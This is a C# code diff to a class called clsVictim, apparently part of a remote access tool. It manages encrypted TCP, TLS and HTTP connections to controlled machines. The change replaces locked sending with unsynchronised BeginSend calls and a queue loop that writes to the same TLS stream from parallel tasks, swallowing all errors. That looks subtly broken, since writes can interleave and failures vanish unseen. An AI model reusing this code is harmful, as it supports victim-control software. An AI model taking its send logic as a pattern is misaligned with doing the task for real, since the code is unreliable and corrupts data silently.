@@ -12,6 +12,7 @@ using Plugin.Abstractions48;
 using System.Runtime.InteropServices.WindowsRuntime;
 using System.Windows.Forms;
 using System.Threading;
+using System.Collections.Concurrent;
 
 namespace winClient48
 {
@@ -31,9 +32,8 @@ namespace winClient48
 
         public enProtocol m_protocol { get; set; }
 
-        //Lock
-        private readonly SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);
-        private readonly SemaphoreSlim _sslSemaphore = new SemaphoreSlim(1, 1);
+        public BlockingCollection<byte[]> _tlsSendQueue = new BlockingCollection<byte[]>(new ConcurrentQueue<byte[]>());
+        private CancellationTokenSource _tlsCts { get; set; }
 
         public clsVictim(Socket socket)
         {
@@ -48,6 +48,18 @@ namespace winClient48
             m_sslClnt = sslClnt;
 
             m_protocol = enProtocol.TLS;
+
+            _tlsCts = new CancellationTokenSource();
+            fnTlsSendLoop(_tlsCts.Token);
+        }
+
+        ~clsVictim()
+        {
+            if (_tlsCts != null)
+            {
+                _tlsSendQueue.CompleteAdding();
+                _tlsCts.Cancel();
+            }
         }
 
         public enum enProtocol
@@ -68,18 +80,18 @@ namespace winClient48
 
             try
             {
-                await _tcpSemaphore.WaitAsync();
-
-                int nOffset = 0;
-                while (nOffset < buffer.Length)
+                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                 {
-                    int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
-                    nOffset += nSent;
-                }
+                    socket.EndSend(ar);
+                }), buffer);
+            }
+            catch
+            {
+                
             }
             finally
             {
-                _tcpSemaphore.Release();
+                
             }
         }
 
@@ -90,18 +102,18 @@ namespace winClient48
 
             try
             {
-                await _tcpSemaphore.WaitAsync();
-
-                int nOffset = 0;
-                while (nOffset < buffer.Length)
+                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                 {
-                    int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
-                    nOffset += nSent;
-                }
+                    socket.EndSend(ar);
+                }), buffer);
+            }
+            catch
+            {
+
             }
             finally
             {
-                _tcpSemaphore.Release();
+
             }
         }
 
@@ -142,7 +154,7 @@ namespace winClient48
                     encSend(2, 0, payload);
                     break;
                 case enProtocol.TLS:
-                    fnSslSendRAW(Encoding.UTF8.GetBytes(payload));
+                    fnSslSendRAW(2, 0, Encoding.UTF8.GetBytes(payload));
                     break;
                 case enProtocol.HTTP:
                     fnHttpSend(clsCrypto.AESEncrypt(payload, _AES.key, _AES.iv));
@@ -165,7 +177,9 @@ namespace winClient48
         /// SSL send raw data.
         /// </summary>
         /// <param name="abBuffer"></param>
-        public async void fnSslSendRAW(byte[] abBuffer) => await fnSslSendRAW(2, 0, abBuffer);
+        public void fnSslSendRAW(byte[] abBuffer) => fnSslSendRAW(0, 0, abBuffer);
+
+        public void fnSslSendRAW(int nCmd, int nParam, string szMsg) => fnSslSendRAW(nCmd, nParam, Encoding.UTF8.GetBytes(szMsg));
 
         /// <summary>
         /// SSL send raw data.
@@ -174,24 +188,36 @@ namespace winClient48
         /// <param name="nParam"></param>
         /// <param name="abBuffer"></param>
         /// <returns></returns>
-        public async Task fnSslSendRAW(int nCmd, int nParam, byte[] abBuffer)
+        public void fnSslSendRAW(int nCmd, int nParam, byte[] abBuffer)
         {
             byte[] abData = new clsDSP((byte)nCmd, (byte)nParam, abBuffer).GetBytes();
 
-            await _sslSemaphore.WaitAsync();
-            try
+            _tlsSendQueue.Add(abData);
+        }
+
+        public Task fnTlsSendLoop(CancellationToken ct)
+        {
+            return Task.Run(() =>
             {
-                await m_sslClnt.WriteAsync(abData, 0, abData.Length);
-                //await m_sslClnt.FlushAsync();
-            }
-            catch (Exception ex)
-            {
-                
-            }
-            finally
-            {
-                _sslSemaphore.Release();
-            }
+                try
+                {
+                    foreach (var data in _tlsSendQueue.GetConsumingEnumerable(ct))
+                    {
+                        Task.Run(() =>
+                        {
+                            m_sslClnt.Write(data, 0, data.Length);
+                            m_sslClnt.Flush();
+                        });
+                    }
+                }
+                catch (OperationCanceledException)
+                {
+
+                }
+                catch (Exception ex)
+                {
+                }
+            }, ct);
         }
 
         /// <summary>
@@ -238,7 +264,7 @@ namespace winClient48
                     Send(nParam, nParam, abData);
                     break;
                 case enProtocol.TLS:
-                    await fnSslSendRAW(nCmd, nParam, abData);
+                    fnSslSendRAW(nCmd, nParam, abData);
                     break;
             }
         }
